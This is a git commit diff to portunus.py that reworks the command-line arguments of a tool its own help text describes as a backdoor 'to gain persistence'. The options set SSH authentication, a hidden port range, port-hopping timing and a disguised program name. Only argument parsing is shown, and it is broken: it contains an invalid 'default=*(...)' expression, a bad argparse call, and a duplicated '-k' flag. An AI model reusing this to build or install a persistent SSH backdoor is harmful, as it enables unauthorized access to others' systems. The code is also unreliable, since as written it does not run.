0c4cf45596da7eb16e1648ad060328eb299743b9
Maxwell <msf9542@g.rit.edu>
2020-06-14 21:02:14 -0400

    changes to parse_args()

--- portunus.py
+++ portunus.py
@@ -14,7 +14,8 @@ def parse_args():
     Parses command line arguments
     """
     parser = argparse.ArgumentParser()
-    auth = parser.add_mutually_exclusive_group(
+    install = parser.add_mutually_exclusive_group()
+    auth = install.add_mutually_exclusive_group(
         description="creates a backdoor to install on a system to gain persistence")
     auth.add_argument('-k', '--key', nargs=1, type=str,
                       help='enable ssh-key authentication')
@@ -25,13 +26,13 @@ def parse_args():
                            type=int, help='add ssh authentication password')
     auth.add_argument('--none', action='store_true',
                       help='ssh authentication will use nothing', default=False)
-    parser.add_argument('-k', '--key', type=str, nargs=1,
-                        help='randomization key for which port location of ssh will be open', default=False)
-    parser.add_argument('-r', '--range', type=int, nargs=2, help='range of ports the ssh shell wil be hosted on', default=*(49152, 65535))
-    parser.add_argument('-t', '--time', type=int, nargs=1,
-                        help='time (in minutes) between when the shell will change port locations', default=3600)
-    parser.add_argument('-n', '--name', type=str, nargs=1,
-                        help='name of program when getting duplicated', default='portunus.py')
+    install.add_argument('-k', '--key', type=str, nargs=1,
+                         help='randomization key for which port location of ssh will be open', default=False)
+    install.add_argument('-r', '--range', type=int, nargs=2, help='range of ports the ssh shell wil be hosted on', default=*(49152, 65535))
+    install.add_argument('-t', '--time', type=int, nargs=1,
+                         help='time (in minutes) between when the shell will change port locations', default=3600)
+    install.add_argument('-n', '--name', type=str, nargs=1,
+                         help='name of program when getting duplicated', default='portunus.py')
     return parser.parse_args()
 
 
